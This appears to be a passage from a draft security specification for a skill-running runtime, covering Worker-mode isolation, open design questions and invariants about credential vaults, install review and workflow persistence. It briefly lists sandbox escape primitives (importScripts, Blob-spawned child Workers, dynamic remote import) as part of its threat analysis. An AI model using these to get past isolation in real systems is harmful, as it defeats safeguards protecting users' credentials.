**Mode-mismatch handling.** When a skill declaring `execution: 'worker'` is installed against a runtime that doesn't support Worker mode, the install is rejected with a clear message (§4.1). The runtime never silently falls back to default mode; doing so would undermine the security commitment the author made by declaring Worker.

**Worker-mode's strength comes from a combination of mechanisms.** The DOM-based escapes from §2.4 are closed cleanly. But three of the §2.4 escapes still apply inside a Worker:

- `importScripts(url)` — Worker-native synchronous fetch + execute. Bypasses any `fetch` proxy.
- `new Worker(URL.createObjectURL(new Blob([code])))` — Workers can spawn child Workers with fresh global scopes.
- Dynamic `import('https://...')` — works in module workers.

Worker-mode's real strength comes from a combination of:

1. A **strict Content Security Policy** on the host page that constrains Worker fetch at the platform level.
2. **In-Worker shadowing or removal** of capability-bearing globals — `importScripts`, network globals, `Worker` itself if child-Worker creation is denied.
3. The **message-passing channel** as the new enforcement boundary, with message validation.
4. **Platform-level restrictions** on the Worker — module-worker vs classic, whether `importScripts` is even available, what host-page CSP inherits.

The message channel is one piece of the cage, not the whole cage.

**Open for v0.7 (Worker-mode full design):**

- The message-passing contract (RPC shape, async invocation, error propagation, capability bridging).
- Which runtime APIs are bridged into the Worker context, with what permission-enforcement model.
- Which in-Worker globals are blocked or shadowed.
- What host-page restrictions the runtime applies (CSP directives, sandbox attributes).
- Whether child-Worker creation is allowed at all; if yes, with what scoping.
- Ergonomic costs to skill authors, and how the spec surfaces these.
- Whether some permission combinations (e.g. `vault:*` + `network:*`) trigger a Worker-mode *requirement* regardless of import status.

v0.6 commits to: mode-selection model (above), one-Worker-per-skill-instance with permitted pooling, reject-with-message on mode mismatch, and the recognition that Worker-mode's strength is a combination of mechanisms.

---

## 12. Invariants (extended)

In addition to the v0.10 invariants:

8. The credential vault (`rwa_vault`) is scoped by user-declared namespaces, not by origin. Skills access only namespaces they were approved for at install time. Vault contents never serialize into any document's inline snapshot or shared variant.
9. Skills are local to the user, not to the document. A document declares intent; the local skill library provides capability. The library lives in a runtime-managed IDB store, not in any individual document.
10. **Skill installation is the privileged moment, and the trust anchor.** The runtime requires user review of skill code and permissions before adding a skill to the library, supported by an install-dialog capability scan that surfaces proxy-bypassing capability uses and obfuscation patterns (§4.1). No path exists from running code to "the library now has a new skill" without user-mediated review. The library API that adds skills is not exposed to skill code. Runtime permission enforcement at invocation time is defense-in-depth (§2.4), not a sandbox; install-time review is what defends against adversarial skills. Skills that need adversarial-grade isolation opt into Worker-mode (§11.12). A runtime that does not support a declared execution mode rejects the install rather than falling back silently.
11. Self-modifying workflows cannot grant themselves new skills, cannot change their own trigger, and cannot bypass the commit gate to persist graph changes without explicit user action via ⌘S.
12. **Self-modifications persist only when the run is initiated by the manual trigger** — user clicks Run on the runtime's UI — *and* the user explicitly commits via ⌘S. All other triggers (`on_open`, `cron:*`, `on_change:*`) and document-driven programmatic invocations via `runtime.workflow.run()` produce in-memory graph changes that discard at run end. Workflow state (`rwa_workflow_state`) persists across runs regardless of trigger; only workflow *structure* is bound by this rule. The runtime enforces the rule by inspecting the workflow's declared trigger and the call site for programmatic invocations, not by detecting headless mode.
13. The bootstrap continues to be the only immutable shell. Skills, workflows, vault, and their state all live in IDB and are subject to the same byte-identity rules as document state.
14. A workflow file is the same file in authoring, testing, and unattended (cron / headless) execution. Only the opener differs, and the persistence model is determined by the trigger and call site, not the opener.
15. The server (share host, remote runtime, cron host, sync target) is convenience, not custody. Any feature that requires the server to remain available, trustworthy, or cooperative for the file to keep working is rejected.

---

*Draft v0.6 — resolves the trust-mechanism ambiguity by collapsing the trusted-vs-untrusted import distinction (§11.12); commits to reject-with-message for unsupported-mode installs (§4.1, invariant 10); sketches `RunResult` (§5.5); pins `tested_modes` default to `['default']` (§2.1); commits one-Worker-per-skill-instance with permitted pooling (§11.12); generalizes long-running headless implication (§3.4, §7.3); specifies in-edit timeout behavior (§5.4); corrects cross-container coordination to use the bus (§8.2). Carry-over deferrals to v0.7: §11.1 (common skill set contents), §11.7 (local-LLM config), §11.8 (Argon2id parameters), §11.9 (skill share format — now tied to eventual mechanical trust signal), §11.10 (permission pattern syntax), §11.11 (draft skill UI), §11.12 (full Worker-mode design). v0.7's highest-leverage cluster: §11.9 + §11.10 + §11.12, which together complete the security model's remaining corners.*
